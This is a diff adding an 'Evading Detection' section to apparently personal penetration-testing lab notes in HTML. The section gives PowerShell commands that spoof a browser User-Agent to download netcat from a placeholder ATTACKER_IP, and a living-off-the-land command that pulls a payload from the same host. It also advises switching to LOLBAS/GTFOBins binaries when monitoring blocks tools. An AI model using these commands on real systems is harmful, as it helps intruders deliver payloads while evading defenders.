@@ -336,6 +336,27 @@ html
             </div>
 
             <div class="section">
+  <h3>🕶️ Evading Detection (Lab Notes)</h3>
+
+  <h4>Change PowerShell User-Agent</h4>
+  <p>Some defenders hunt for obvious PowerShell user agents (e.g., <code>WindowsPowerShell/5.x</code> / <code>powershell-session</code>). In lab, I tested changing the User-Agent to blend in with common browsers.</p>
+  <div class="command-block">
+    <code>$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest "http://ATTACKER_IP/nc.exe" -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"</code>
+  </div>
+
+  <h4>Fallback: LOLBAS / GTFOBins</h4>
+  <p>If PowerShell or common tools are blocked (application whitelisting) or too noisy (command-line logging), a “living off the land” binary may still be allowed and can handle file transfer.</p>
+  <div class="command-block">
+    <code>GfxDownloadWrapper.exe "http://ATTACKER_IP/payload.exe" "C:\Temp\payload.exe"</code>
+  </div>
+
+  <div class="highlight-box">
+    <strong>Rule:</strong> If the normal method is blocked or heavily monitored, check <strong>LOLBAS</strong> (Windows) or <strong>GTFOBins</strong> (Linux) for an allowed binary that can download/upload.
+  </div>
+</div>
+
+            <div class="section">
                 <h3>🪓 Living off the Land – File Transfers</h3>
                 <p>Instead of uploading custom tools, I practiced abusing <strong>built-in binaries</strong> on Windows and Linux to move files. This “living off the land” approach is quieter because I’m just using software that’s already installed and usually trusted.</p>
 
